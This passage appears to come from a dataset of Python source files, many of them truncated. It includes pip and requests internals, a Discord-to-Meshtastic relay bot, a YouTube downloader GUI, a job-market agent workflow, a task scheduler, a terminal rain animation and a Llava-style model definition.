location: str) -> Tuple[Optional[str], int]:\n        from pip._internal.exceptions import InstallationError\n\n        entries_path = os.path.join(location, cls.dirname, \"entries\")\n        if os.path.exists(entries_path):\n            with open(entries_path) as f:\n                data = f.read()\n        else:  # subversion >= 1.7 does not have the 'entries' file\n            data = \"\"\n\n        url = None\n        if data.startswith(\"8\") or data.startswith(\"9\") or data.startswith(\"10\"):\n            entries = list(map(str.splitlines, data.split(\"\\n\\x0c\\n\")))\n            del entries[0][0]  # get rid of the '8'\n            url = entries[0]",
    "from linked_list import DoublyLinkedList\n\n# Initialize the LinkedList\ntrip = DoublyLinkedList()\n\n# Insert at the end\nprint(\"Insert at the end:\")\ntrip.insertAtEnd(\"Chennai\", \"TN\", 600059)\ntrip.insertAtEnd(\"Bangalore\", \"KT\", 700059)\ntrip.insertAtEnd(\"Hyderabad\", \"TL\", 800059)\ntrip.insertAtEnd(\"Mumbai\", \"MH\", 900059)\ntrip.traversal()\n\n# Insert at the beginning\nprint(\"\\nInsert at the beginning:\")\ntrip.insertAtBeginning(\"Kochin\", \"KR\", 501254)\ntrip.traversal()\n\n# Insert at a specific index\nprint(\"\\nInsert at index 0:\")\ntrip.insertAt(0, city=\"Goa\", state=\"Goa\", pincode=125784)\ntrip.traversal()\n\nprint(\"\\nInsert at the last index (index 6):\")\ntrip.insertAt(6, city=\"Delhi\", state=\"Delhi\", pincode=215784)\ntrip.traversal()\n\nprint(\"\\nInsert at index 5:\")\ntrip.insertAt(5, city=\"Secundrabad\", state=\"TL\", pincode=412563)\ntrip.traversal()\n\n# Delete from the beginning\nprint(\"\\nDelete at the beginning:\")\ntrip.deleteAtBegin()\ntrip.traversal()\n\n# Delete from the end\nprint(\"\\nDelete at the end:\")\ntrip.deleteAtEnd()\ntrip.traversal()\n\n# Delete at a specific index\nprint(\"\\nDelete at index 3:\")\ntrip.deleteAt(3)\ntrip.traversal()\n\n# Remove by value\nprint(\"\\nRemove by value (Hyderabad):\")\ntrip.removeAt(\"Hyderabad\")\ntrip.traversal()\n\nprint(\"\\nRemove by value (Non-existent city):\")\ntrip.removeAt(\"Pune\")\ntrip.traversal()\n\n# Search for a value\nprint(\"\\nSearch for 'Mumbai':\")\ntrip.search(\"Mumbai\")\n\nprint(\"\\nSearch for 'Pune':\")\ntrip.search(\"Pune\")\n\n",
    "\"\"\"\nrequests.adapters\n~~~~~~~~~~~~~~~~~\n\nThis module contains the transport adapters that Requests uses to define\nand maintain connections.\n\"\"\"\n\nimport os.path\nimport socket  # noqa: F401\nimport typing\nimport warnings\n\nfrom pip._vendor.urllib3.exceptions import ClosedPoolError, ConnectTimeoutError\nfrom pip._vendor.urllib3.exceptions import HTTPError as _HTTPError\nfrom pip._vendor.urllib3.exceptions import InvalidHeader as _InvalidHeader\nfrom pip._vendor.urllib3.exceptions import (\n    LocationValueError,\n    MaxRetryError,\n    NewConnectionError,\n    ProtocolError,\n)\nfrom pip._vendor.urllib3.exceptions import ProxyError as _ProxyError\nfrom pip._vendor.urllib3.exceptions import ReadTimeoutError, ResponseError\nfrom pip._vendor.urllib3.exceptions import SSLError as _SSLError\nfrom pip._vendor.urllib3.poolmanager import PoolManager, proxy_from_url\nfrom pip._vendor.urllib3.util import Timeout as TimeoutSauce\nfrom pip._vendor.urllib3.util import parse_url\nfrom pip._vendor.urllib3.util.retry import Retry\nfrom pip._vendor.urllib3.util.ssl_ import create_urllib3_context\n\nfrom .auth import _basic_auth_str\nfrom .compat import basestring, urlparse\nfrom .cookies import extract_cookies_to_jar\nfrom .exceptions import (\n    ConnectionError,\n    ConnectTimeout,\n    InvalidHeader,\n    InvalidProxyURL,\n    InvalidSchema,\n    InvalidURL,\n    ProxyError,\n    ReadTimeout,\n    RetryError,\n    SSLError,\n)\nfrom .models import Response\nfrom .structures import CaseInsensitiveDict\nfrom .utils import (\n    DEFAULT_CA_BUNDLE_PATH,\n    extract_zipped_paths,\n    get_auth_from_url,\n    get_encoding_from_headers,\n    prepend_scheme_if_needed,\n    select_proxy,\n    urldefragauth,\n)\n\ntry:\n    from pip._vendor.urllib3.contrib.socks import SOCKSProxyManager\nexcept ImportError:\n\n    def SOCKSProxyManager(*args, **kwargs):\n        raise InvalidSchema(\"Missing dependencies for SOCKS support.\")\n\n\nif typing.TYPE_CHECKING:\n    from .models import PreparedRequest\n\n\nDEFAULT_POOLBLOCK = False\nDEFAULT_POOLSIZE = 10\nDEFAULT_RETRIES = 0\nDEFAULT_POOL_TIMEOUT = None\n\n\ntry:\n    import ssl  # noqa: F401\n\n    _preloaded_ssl_context = create_urllib3_context()\n    _preloaded_ssl_context.load_verify_locations(\n        extract_zipped_paths(DEFAULT_CA_BUNDLE_PATH)\n    )\nexcept ImportError:\n    # Bypass default SSLContext creation when Python\n    # interpreter isn't built with the ssl module.\n    _preloaded_ssl_context = None\n\n\ndef _urllib3_request_context(\n    request: \"PreparedRequest\",\n    verify: \"bool | str | None\",\n    client_cert: \"typing.Tuple[str, str] | str | None\",\n    poolmanager: \"PoolManager\",\n) -> \"(typing.Dict[str, typing.Any], typing.Dict[str, typing.Any])\":\n    host_params = {}\n    pool_kwargs = {}\n    parsed_request_url = urlparse(request.url)\n    scheme = parsed_request_url.scheme.lower()\n    port = parsed_request_url.port\n\n    # Determine if we have and should use our default SSLContext\n    # to optimize performance on standard requests.\n    poolmanager_kwargs = getattr(poolmanager, \"connection_pool_kw\", {})\n    has_poolmanager_ssl_context = poolmanager_kwargs.get(\"ssl_context\")\n    should_use_default_ssl_context = (\n        _preloaded_ssl_context is not None and not has_poolmanager_ssl_context\n    )\n\n    cert_reqs = \"CERT_REQUIRED\"\n    if verify is False:\n        cert_reqs = \"CERT_NONE\"\n    elif verify is True and should_use_default_ssl_context:\n        pool_kwargs[\"ssl_context\"] = _preloaded_ssl_context\n    elif isinstance(verify, str):\n        if not os.path.isdir(verify):\n            pool_kwargs[\"ca_certs\"] = verify\n        else:\n            pool_kwargs[\"ca_cert_dir\"] = verify\n    pool_kwargs[\"cert_reqs\"] = cert_reqs\n    if client_cert is not None:\n        if isinstance(client_cert, tuple) and len(client_cert) == 2:\n            pool_kwargs[\"cert_file\"] = client_cert[0]\n            pool_kwargs[\"key_file\"] = client_cert[1]\n        else:\n            # According to our docs, we allow users to specify just the client\n            # cert path\n            pool_kwargs[\"cert_file\"] = client_cert\n    host_params = {\n        \"scheme\": scheme,\n        \"host\": parsed_request_url.hostname,\n        \"port\": port,\n    }\n    return host_params, pool_kwargs\n\n\nclass BaseAdapter:\n    \"\"\"The Base Transport Adapter\"\"\"\n\n    def __init__(self):\n        super().__init__()\n\n    def send(\n        self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None\n    ):\n        \"\"\"Sends PreparedRequest object. Returns Response object.\n\n        :param request: The :class:`PreparedRequest <PreparedRequest>` being sent.\n        :param stream: (optional) Whether to stream the request content.\n        :param timeout: (optional) How long to wait for the server to send\n            data before giving up, as a float, or a :ref:`(connect timeout,\n            read timeout) <timeouts>` tuple.\n        :type timeout: float or tuple\n        :param verify: (optional) Either a boolean, in which case it controls whether we verify\n            the server's TLS certificate, or a s",
    "# IMPORT DISCORD.PY. ALLOWS ACCESS TO DISCORD'S API.\nimport re\nimport sys\nimport time\n\nimport discord\nfrom pubsub import pub\nimport meshtastic\nimport meshtastic.tcp_interface\n\nintents = discord.Intents.default()\nintents.messages = True\nintents.message_content = True\n\nwith open(\"token.txt\", \"r\") as f:\n\ttoken = f.read().strip()\n\n# GETS THE CLIENT OBJECT FROM DISCORD.PY. CLIENT IS SYNONYMOUS WITH BOT.\nbot = discord.Client(intents=intents)\n\nnode_ip = \"192.168.86.24\"\n\n# EVENT LISTENER FOR WHEN THE BOT HAS SWITCHED FROM OFFLINE TO ONLINE.\n@bot.event\nasync def on_ready():\n\t# CREATES A COUNTER TO KEEP TRACK OF HOW MANY GUILDS / SERVERS THE BOT IS CONNECTED TO.\n\tguild_count = 0\n\n\t# LOOPS THROUGH ALL THE GUILD / SERVERS THAT THE BOT IS ASSOCIATED WITH.\n\tfor guild in bot.guilds:\n\t\t# PRINT THE SERVER'S ID AND NAME.\n\t\tprint(f\"- {guild.id} (name: {guild.name})\")\n\n\t\t# INCREMENTS THE GUILD COUNTER.\n\t\tguild_count = guild_count + 1\n\n\t# PRINTS HOW MANY GUILDS / SERVERS THE BOT IS IN.\n\tprint(\"Meshtastic Discord Bot is in \" + str(guild_count) + \" guilds.\")\n\n# EVENT LISTENER FOR WHEN A NEW MESSAGE IS SENT TO A CHANNEL.\n@bot.event\nasync def on_message(message):\n\tif message.author == bot.user:\n\t\treturn\n\t# CHECKS IF THE MESSAGE THAT WAS SENT IS EQUAL TO \"HELLO\".\n\tif bot.user.mentioned_in(message):\n\t\tmsg_content = message.clean_content.replace(\"@Meshtastic Publisher\", \"\").strip()\n\t\tmsg = f\"{message.author.display_name}@Discord: \\\"\" + msg_content + \"\\\"\"\n\n\t\ttry:\n\t\t\tiface = meshtastic.tcp_interface.TCPInterface(hostname=node_ip)\n\t\texcept Exception as ex:\n\t\t\tprint(f\"Error: Could not connect to {node_ip} {ex}\")\n\t\t\tawait message.channel.send(f\"Failed to send message via SLAM node.\")\n\n\t\ttime.sleep(1)\n\t\tiface.sendText(msg)\n\t\tiface.close()\n\n\t\tdiscord_msg = f\"Sent message \\\"{msg_content}\\\" over mesh via SLAM.\"\n\t\tprint(discord_msg)\n\t\tawait message.channel.send(discord_msg)\n\n# EXECUTES THE BOT WITH THE SPECIFIED TOKEN. TOKEN HAS BEEN REMOVED AND USED JUST AS AN EXAMPLE.\nbot.run(token)\n",
    "\"\"\"Main entry point for job market analysis workflow.\"\"\"\nimport os\nimport sys\nimport json\nimport logging\nimport asyncio\nimport argparse\nfrom typing import Dict, List, Optional, TypedDict\nfrom pathlib import Path\nfrom datetime import datetime\n\nfrom dotenv import load_dotenv\n\nfrom .job_agents.job_data_collector_agent import JobDataCollectorAgent\nfrom .job_agents.tech_analyzer_agent import TechAnalyzerAgent\nfrom .job_agents.market_reporter import MarketReporterAgent\nfrom .job_agents.ai_impact_analyzer import AIImpactAnalyzerAgent\nfrom .job_agents.final_reporter import FinalReporterAgent\n\n# Configure logging\nlogging.basicConfig(\n    level=logging.INFO,\n    format='%(levelname)s:%(name)s:%(message)s'\n)\nlogger = logging.getLogger(__name__)\n\n# Load environment variables\nload_dotenv()\n\nclass JobMarketState(TypedDict):\n    \"\"\"State management for job market analysis workflow.\"\"\"\n    job_data: Optional[List[Dict]]\n    tech_analysis: Optional[Dict]\n    market_report: Optional[Dict]\n    ai_impact: Optional[Dict]\n    final_report: Optional[Dict]\n    error: Optional[str]\n\nclass JobMarketWorkflow:\n    \"\"\"Orchestrates the job market analysis workflow.\"\"\"\n    \n    def __init__(self, force_new_collection: bool = False):\n        \"\"\"Initialize workflow.\"\"\"\n        logger.info(\"Initializing JobMarketWorkflow\")\n        \n        # Load environment variables\n        self.serpapi_key = os.getenv(\"SERPAPI_API_KEY\")\n        self.openai_key = os.getenv(\"OPENAI_API_KEY\")\n        \n        if not self.serpapi_key or not self.openai_key:\n            raise ValueError(\"Missing required API keys\")\n            \n        # Initialize agents\n        self.collector = JobDataCollectorAgent(self.serpapi_key, self.openai_key)\n        self.analyzer = TechAnalyzerAgent(self.openai_key)\n        self.reporter = MarketReporterAgent(self.openai_key)\n        self.impact_analyzer = AIImpactAnalyzerAgent(self.openai_key)\n        self.final_reporter = FinalReporterAgent(self.openai_key)\n        \n        self.force_new_collection = force_new_collection\n        self.data_dir = Path(\"data\")\n        logger.info(\"Workflow initialized\")\n    \n    async def collect_data(self) -> List[Dict]:\n        \"\"\"Collect job data.\"\"\"\n        logger.info(\"Collecting job data\")\n        try:\n            if not self.force_new_collection and (self.data_dir / \"job_data.json\").exists():\n                logger.info(\"Loading existing job data\")\n                with open(self.data_dir / \"job_data.json\", 'r') as f:\n                    return json.load(f)\n            \n            job_data = await self.collector.collect_jobs()\n            self.data_dir.mkdir(exist_ok=True)\n            with open(self.data_dir / \"job_data.json\", 'w') as f:\n                json.dump(job_data, f, indent=2)\n            return job_data\n        except Exception as e:\n            logger.error(f\"Error collecting data: {str(e)}\")\n            raise\n    \n    async def analyze_tech(self, job_data: List[Dict]) -> Dict:\n        \"\"\"Analyze tech requirements.\"\"\"\n        logger.info(\"Analyzing tech requirements\")\n        try:\n            if not self.force_new_collection and (self.data_dir / \"tech_analysis.json\").exists():\n                logger.info(\"Loading existing tech analysis\")\n                with open(self.data_dir / \"tech_analysis.json\", 'r') as f:\n                    return json.load(f)\n            \n            tech_analysis = await self.analyzer.analyze_tech_requirements(job_data)\n            with open(self.data_dir / \"tech_analysis.json\", 'w') as f:\n                json.dump(tech_analysis, f, indent=2)\n            return tech_analysis\n        except Exception as e:\n            logger.error(f\"Error analyzing tech: {str(e)}\")\n            raise\n    \n    async def generate_market_report(self, job_data: List[Dict], tech_analysis: Dict) -> Dict:\n        \"\"\"Generate market report.\"\"\"\n        logger.info(\"Generating market report\")\n        try:\n            if not self.force_new_collection and (self.data_dir / \"market_report.json\").exists():\n                logger.info(\"Loading existing market report\")\n                with open(self.data_dir / \"market_report.json\", 'r') as f:\n                    return json.load(f)\n            \n            market_report = await self.reporter.generate_report(job_data, tech_analysis)\n            with open(self.data_dir / \"market_report.json\", 'w') as f:\n                json.dump(market_report, f, indent=2)\n            return market_report\n        except Exception as e:\n            logger.error(f\"Error generating market report: {str(e)}\")\n            raise\n    \n    async def analyze_ai_impact(self, job_data: List[Dict], tech_analysis: Dict, market_report: Dict) -> Dict:\n        \"\"\"Analyze AI impact.\"\"\"\n        logger.info(\"Analyzing AI impact\")\n        try:\n            if not self.force_new_collection and (self.data_dir / \"ai_impact_analysis.json\").exists():\n                logger.info(\"Loading existing AI impact analysis\")\n                with open(self.data_dir / \"ai_impact_analysis.json\", '",
    "#Checkout my other projects! https://github.com/Justagwas\n#The OFFICIAL Repo of this is - https://github.com/Justagwas/YouTube-Converter\nimport tkinter as tk\nfrom tkinter import messagebox\nfrom yt_dlp import YoutubeDL\nimport threading\nimport os\nimport sys\nimport re\nfrom urllib.parse import urlparse, parse_qs, urlunparse\nimport ctypes as ct\n\nclass YouTubeDownloader:\n    def __init__(self, root):\n        self.root = root\n        self.root.title(\"YouTube Converter SOURCE CODE/NOT OFFICIAL RELEASE\")\n        self.root.geometry(\"500x260\")\n        self.root.configure(bg=\"gray25\")\n        self.download_thread = None\n        self.ydl = None\n        self.root.resizable(False, False) \n        self.set()\n        self.create_widgets()\n\n    def create_widgets(self):\n        self.url_label = tk.Label(self.root, text=\"YouTube URL:\", bg=\"gray25\", fg=\"gray80\")\n        self.url_label.pack(pady=5)\n\n        self.url_frame = tk.Frame(self.root, bg=\"gray25\")\n        self.url_frame.pack(pady=5)\n\n        self.url_entry = tk.Entry(self.url_frame, width=40)\n        self.url_entry.pack(side=tk.LEFT, padx=5)\n\n        self.paste_button = tk.Button(\n            self.url_frame, text=\"PASTE\", command=self.paste_url, bg=\"gray80\", fg=\"gray25\"\n        )\n        self.paste_button.pack(side=tk.LEFT, padx=5)\n\n        self.format_var = tk.StringVar(value=\"Select Format\")\n        self.quality_var = tk.StringVar(value=\"Select Quality\")\n\n        self.format_frame = tk.Frame(self.root, bg=\"gray25\")\n        self.format_frame.pack(pady=5)\n\n        self.format_options = [\n            \"mp4 (Video&Audio)\", \"mov (Video&Audio)\", \"webm (Video)\",\n            \"mp3 (Audio)\", \"wav (Audio)\"\n        ]\n        self.quality_options = [\"Select Quality\"]  # Placeholder for v3.1.0\n\n        self.format_dropdown = tk.OptionMenu(self.format_frame, self.format_var, *self.format_options)\n        self.format_dropdown.config(bg=\"gray25\", fg=\"gray80\", width=20)\n        self.format_dropdown.pack(side=tk.LEFT, padx=10)\n\n        self.quality_dropdown = tk.OptionMenu(self.format_frame, self.quality_var, *self.quality_options)\n        self.quality_dropdown.config(bg=\"gray25\", fg=\"gray80\", width=20)\n        self.quality_dropdown.pack(side=tk.LEFT, padx=10)\n\n        self.download_button = tk.Button(self.root, text=\"DOWNLOAD\", command=self.start_download, bg=\"gray80\", fg=\"gray25\")\n        self.download_button.pack(pady=10)\n\n        self.abort_button = tk.Button(self.root, text=\"TERMINATE\", command=self.abort_download, bg=\"gray80\", fg=\"gray25\")\n        self.abort_button.pack(pady=5)\n\n        self.status_label = tk.Label(self.root, text=\"\", bg=\"gray25\", fg=\"gray80\")\n        self.status_label.pack(pady=5)\n\n    def paste_url(self):\n        try:\n            self.url_entry.delete(0, tk.END)\n            self.url_entry.insert(0, self.root.clipboard_get())\n        except tk.TclError:\n            messagebox.showerror(\"Error\", \"No URL found in clipboard\")\n\n    def sanitize_filename(self, name):\n        return re.sub(r'[<>:\"/\\\\|?*]', '', name)\n\n    def sanitize_url(self, url):\n        parsed_url = urlparse(url)\n        if parsed_url.netloc not in [\"www.youtube.com\", \"youtube.com\", \"youtu.be\"]:\n            return None\n        query = parse_qs(parsed_url.query)\n        clean_query = {k: query[k] for k in query if k in [\"v\", \"list\"]}\n        sanitized_url = urlunparse(parsed_url._replace(query=\"&\".join(f\"{k}={v[0]}\" for k, v in clean_query.items())))\n        return sanitized_url\n\n    def start_download(self):\n        url = self.url_entry.get()\n        if not url:\n            messagebox.showerror(\"Error\", \"Please enter a YouTube URL\")\n            return\n\n        sanitized_url = self.sanitize_url(url)\n        if not sanitized_url:\n            messagebox.showerror(\"Error\", \"Please enter a valid YouTube URL\")\n            return\n\n        format_choice = self.format_var.get().split()[0]\n        if format_choice == \"Select\":\n            messagebox.showerror(\"Error\", \"Please select a format\")\n            return\n\n        if format_choice == \"mov\":\n            response = messagebox.askyesno(\"MOV Format Selected\", \"MOV format converts MP4 files. The MP4 file (IF EXISTS) will be deleted after conversion. Do you want to continue?\")\n            if not response:\n                return\n\n        self.download_thread = threading.Thread(target=self.download_video, args=(sanitized_url, format_choice))\n        self.download_thread.start()\n\n    def abort_download(self):\n        if self.ydl:\n            self.ydl.download = False\n            self.status_label.config(text=\"Download aborted!\")\n        self.terminate_program()\n\n    def terminate_program(self):\n        self.root.destroy()\n        sys.exit()\n\n    def download_video(self, url, format_choice):\n        self.status_label.config(text=\"Starting download...\")\n\n        output_template = os.path.expanduser(f'~/Downloads/%(title)s.%(ext)s')\n        existing_files = [f for f in os.listdir(os.path.expanduser('~/Downloads')) if os.path.isfile(os.path.join(os.path.expanduser",
    "from scholarly import scholarly\nfrom typing import List\n\nMAX_RESULTS = 10\n\n\nclass GoogleScholar:\n    def __init__(self):\n        self.scholarly = scholarly\n\n    def get_scholarly(self, keyword):\n        return self.scholarly.search_pubs(keyword)\n\n    @staticmethod\n    def _parse_results(search_results):\n        articles = []\n        results_iter = 0\n        for searched_article in search_results:\n            bib = searched_article.get('bib', {})\n            title = bib.get('title', None)\n            abstract = bib.get('abstract', None)\n            pub_url = searched_article.get('pub_url', None)\n            article_string = \"\\n\".join([title, abstract, pub_url])\n            articles.append(article_string)\n            results_iter += 1\n            if results_iter > MAX_RESULTS:\n                break\n        return articles\n\n    def search_pubs(self, keyword) -> List[str]:\n        search_results = self.scholarly.search_pubs(keyword)\n        articles = self._parse_results(search_results)\n        return articles\n",
    "#!/usr/bin/env python3\n\nimport random\nimport curses\nimport time\n\nYELLOW_COLOR = 4\nORANGE_COLOR = 167\nBLACK_COLOR = 1\n\ndef get_window_dimensions(window):\n    height, width = window.getmaxyx()\n    return height - 2, width - 1\n\ndef initialize_rain_drops(screen_width, screen_height):\n    drop_heights = [\n        random.randrange(screen_height // 3 - 4, screen_height // 2 - 4)\n        for _ in range(screen_width)\n    ]\n    \n    drop_starting_positions = [i % (screen_height + 1) for i in range(screen_width)]\n\n    for _ in range(random.randrange(1, 5)):\n        random.shuffle(drop_starting_positions)\n    \n    return drop_heights, drop_starting_positions\n\ndef setup_colors():\n    curses.start_color()\n    curses.use_default_colors()\n    \n    for i in range(0, curses.COLORS): curses.init_pair(i + 1, i, -1)\n\ndef draw_rain_drop(window, row, col, drop_starting_positions, drop_heights, char, screen_height):\n    start_pos = drop_starting_positions[col]\n    length = drop_heights[col]\n    row_mod_height = row % screen_height\n\n    color = curses.color_pair(BLACK_COLOR)\n    style = curses.A_DIM\n\n    if row_mod_height == start_pos:\n        window.addstr(0, col, char, curses.color_pair(ORANGE_COLOR) + curses.A_BOLD)\n    elif row > start_pos:\n        char_to_print = char\n\n        if row_mod_height in {(start_pos + i) % screen_height for i in range(1, 3)}:\n            color = curses.color_pair(YELLOW_COLOR)\n            style = curses.A_BOLD\n        elif row_mod_height == (start_pos + 3) % screen_height and random.randrange(2):\n            color = curses.color_pair(YELLOW_COLOR)\n            style = curses.A_BOLD\n        elif row_mod_height in {start_pos + length - i for i in range(0, 3)}:\n            color = curses.color_pair(YELLOW_COLOR)\n            style = curses.A_DIM\n        else:\n            char_to_print = \" \"\n\n        window.addstr(0, col, char_to_print, color + style)\n\n        if char_to_print == \" \":\n            target_value = row_mod_height - (start_pos % screen_height)\n\n            if target_value < 0: target_value += screen_height\n\n            if 3 <= target_value < length:\n                window.addstr(0, col, char, curses.color_pair(YELLOW_COLOR))\n\n    else:\n        window.addstr(0, col, \" \", color + style)\n\ndef main(window):\n    try:\n        screen_height, screen_width = get_window_dimensions(window)\n        drop_heights, drop_starting_positions = initialize_rain_drops(screen_width, screen_height)\n        setup_colors()\n        curses.curs_set(0)\n\n        row = 0\n        while True:\n            for col in range(screen_width):\n                char = random.choice(\"\u0426\u042e\u0414\u0424\u041e\u0416\u042e\u0411\u0429\u0428\u0466\u046a\u0462\")\n                draw_rain_drop(window, row, col, drop_starting_positions, drop_heights, char, screen_height)\n\n            window.refresh()\n            window.insertln()\n\n            time.sleep(0.1)\n\n            row += 1\n\n    except KeyboardInterrupt:\n        pass\n\n    finally:\n        curses.endwin()\n        curses.curs_set(1)\n\nif __name__ == '__main__':\n    curses.wrapper(main)\n",
    "import asyncio\nfrom typing import Dict, Any, List, Optional, Callable, Coroutine\nfrom dataclasses import dataclass\nimport time\nimport heapq\nfrom datetime import datetime, timedelta\nimport uuid\n\nfrom ..utils.logger import get_logger\nfrom .state import StateManager\nfrom ..blockchain.solana import SolanaManager\n\n@dataclass\nclass Task:\n    \"\"\"Represents a scheduled task in the system\"\"\"\n    id: str\n    name: str\n    coroutine: Coroutine\n    priority: int\n    dependencies: List[str]\n    timeout: float\n    retries: int\n    metadata: Dict[str, Any]\n    solana_verification: bool = False\n    created_at: float = time.time()\n    \n    def __lt__(self, other):\n        return self.priority > other.priority  # Higher priority first\n\nclass TaskScheduler:\n    \"\"\"Advanced task scheduler with Solana integration\"\"\"\n    \n    def __init__(\n        self,\n        max_concurrent_tasks: int = 10,\n        state_manager: Optional[StateManager] = None,\n        solana_manager: Optional[SolanaManager] = None\n    ):\n        self.logger = get_logger(\"task_scheduler\")\n        self.max_concurrent_tasks = max_concurrent_tasks\n        self.state_manager = state_manager\n        self.solana_manager = solana_manager\n        \n        self.task_queue: List[Task] = []\n        self.running_tasks: Dict[str, asyncio.Task] = {}\n        self.completed_tasks: Dict[str, Any] = {}\n        self.failed_tasks: Dict[str, Exception] = {}\n        self.task_dependencies: Dict[str, List[str]] = {}\n        \n        self.running = False\n        self._task_results: Dict[str, asyncio.Future] = {}\n        \n    async def start(self) -> None:\n        \"\"\"Start the task scheduler\"\"\"\n        self.running = True\n        asyncio.create_task(self._scheduler_loop())\n        self.logger.info(\"Task scheduler started\")\n        \n    async def stop(self) -> None:\n        \"\"\"Stop the task scheduler\"\"\"\n        self.running = False\n        # Cancel all running tasks\n        for task in self.running_tasks.values():\n            task.cancel()\n        await asyncio.gather(*self.running_tasks.values(), return_exceptions=True)\n        self.logger.info(\"Task scheduler stopped\")\n        \n    async def schedule_task(\n        self,\n        name: str,\n        coroutine: Coroutine,\n        priority: int = 0,\n        dependencies: List[str] = None,\n        timeout: float = 300,\n        retries: int = 3,\n        metadata: Dict[str, Any] = None,\n        solana_verification: bool = False\n    ) -> str:\n        \"\"\"Schedule a new task\"\"\"\n        task_id = str(uuid.uuid4())\n        task = Task(\n            id=task_id,\n            name=name,\n            coroutine=coroutine,\n            priority=priority,\n            dependencies=dependencies or [],\n            timeout=timeout,\n            retries=retries,\n            metadata=metadata or {},\n            solana_verification=solana_verification\n        )\n        \n        # Store dependencies\n        if dependencies:\n            self.task_dependencies[task_id] = dependencies\n            \n        # Create result future\n        self._task_results[task_id] = asyncio.Future()\n        \n        # Add to queue\n        heapq.heappush(self.task_queue, task)\n        self.logger.debug(f\"Scheduled task {task_id}: {name}\")\n        \n        return task_id\n        \n    async def get_task_result(self, task_id: str, timeout: Optional[float] = None) -> Any:\n        \"\"\"Get the result of a task\"\"\"\n        if task_id not in self._task_results:\n            raise KeyError(f\"Task {task_id} not found\")\n            \n        try:\n            result = await asyncio.wait_for(\n                self._task_results[task_id],\n                timeout=timeout\n            )\n            return result\n        except asyncio.TimeoutError:\n            raise TimeoutError(f\"Task {task_id} result not available within timeout\")\n            \n    async def cancel_task(self, task_id: str) -> bool:\n        \"\"\"Cancel a scheduled or running task\"\"\"\n        # Cancel if running\n        if task_id in self.running_tasks:\n            self.running_tasks[task_id].cancel()\n            return True\n            \n        # Remove from queue if scheduled\n        self.task_queue = [t for t in self.task_queue if t.id != task_id]\n        heapq.heapify(self.task_queue)\n        \n        return True\n        \n    async def _scheduler_loop(self) -> None:\n        \"\"\"Main scheduler loop\"\"\"\n        while self.running:\n            try:\n                await self._process_next_task()\n                await asyncio.sleep(0.1)  # Prevent CPU overload\n            except Exception as e:\n                self.logger.error(f\"Error in scheduler loop: {str(e)}\")\n                \n    async def _process_next_task(self) -> None:\n        \"\"\"Process the next task in queue\"\"\"\n        if not self.task_queue or len(self.running_tasks) >= self.max_concurrent_tasks:\n            return\n            \n        task = heapq.heappop(self.task_queue)\n        \n        # Check dependencies\n        if not await self._check_dependencies(task):\n            heapq.heappu",
    "# coding=utf-8\n# Copyright 2023 the HuggingFace Inc. team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"PyTorch Llava model.\"\"\"\n#\u5148\u4ee5molecule\u6765\u7406\u89e3Image\nfrom dataclasses import dataclass\nfrom typing import List, Optional, Tuple, Union\nfrom copy import deepcopy\nimport torch\nimport torch.utils.checkpoint\nfrom torch import nn\nimport os\nfrom transformers import PreTrainedModel\nfrom transformers.activations import ACT2FN\nfrom transformers.cache_utils import Cache\nfrom transformers.modeling_outputs import ModelOutput\nfrom transformers.utils import (\n    add_start_docstrings,\n    add_start_docstrings_to_model_forward,\n    logging,\n    replace_return_docstrings,\n)\nfrom configuration_llava import MoLlamaConfig\nimport torch.nn.functional as F\n\n\nlogger = logging.get_logger(__name__)\n\n_CONFIG_FOR_DOC = \"MoLlamaConfig\"\n\n\n@dataclass\n# Copied from transformers.models.idefics.modeling_idefics.IdeficsCausalLMOutputWithPast with Idefics->Llava\nclass MoLlamaCausalLMOutputWithPast(ModelOutput):\n    \"\"\"\n    Base class for Llava causal language model (or autoregressive) outputs.\n\n    Args:\n        loss (`torch.FloatTensor` of shape `(1,)`, *optional*, returned when `labels` is provided):\n            Language modeling loss (for next-token prediction).\n        logits (`torch.FloatTensor` of shape `(batch_size, sequence_length, config.vocab_size)`):\n            Prediction scores of the language modeling head (scores for each vocabulary token before SoftMax).\n        past_key_values (`tuple(tuple(torch.FloatTensor))`, *optional*, returned when `use_cache=True` is passed or when `config.use_cache=True`):\n            Tuple of `tuple(torch.FloatTensor)` of length `config.n_layers`, with each tuple having 2 tensors of shape\n            `(batch_size, num_heads, sequence_length, embed_size_per_head)`)\n\n            Contains pre-computed hidden-states (key and values in the self-attention blocks) that can be used (see\n            `past_key_values` input) to speed up sequential decoding.\n        hidden_states (`tuple(torch.FloatTensor)`, *optional*, returned when `output_hidden_states=True` is passed or when `config.output_hidden_states=True`):\n            Tuple of `torch.FloatTensor` (one for the output of the embeddings, if the model has an embedding layer, +\n            one for the output of each layer) of shape `(batch_size, sequence_length, hidden_size)`.\n\n            Hidden-states of the model at the output of each layer plus the optional initial embedding outputs.\n        attentions (`tuple(torch.FloatTensor)`, *optional*, returned when `output_attentions=True` is passed or when `config.output_attentions=True`):\n            Tuple of `torch.FloatTensor` (one for each layer) of shape `(batch_size, num_heads, sequence_length,\n            sequence_length)`.\n\n            Attentions weights after the attention softmax, used to compute the weighted average in the self-attention\n            heads.\n        image_hidden_states (`tuple(torch.FloatTensor)`, *optional*):\n            Tuple of `torch.FloatTensor` (one for the output of the image embeddings, `(batch_size, num_images,\n            sequence_length, hidden_size)`.\n\n            image_hidden_states of the model produced by the vision encoder, and optionally by the perceiver\n    \"\"\"\n\n    loss: Optional[torch.FloatTensor] = None\n    logits: torch.FloatTensor = None\n    past_key_values: Optional[List[torch.FloatTensor]] = None\n    hidden_states: Optional[Tuple[torch.FloatTensor]] = None\n    attentions: Optional[Tuple[torch.FloatTensor]] = None\n    molecule_hidden_states: Optional[Tuple[torch.FloatTensor]] = None\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\nclass CrossAttention(nn.Module):\n    def __init__(self, embed_dim, num_heads, num_queries, norm_layer=nn.LayerNorm):\n        super().__init__()\n        self.embed_dim = embed_dim\n        self.num_heads = num_heads\n        self.num_queries = num_queries\n        self.query = nn.Parameter(torch.randn(self.num_queries, embed_dim) / 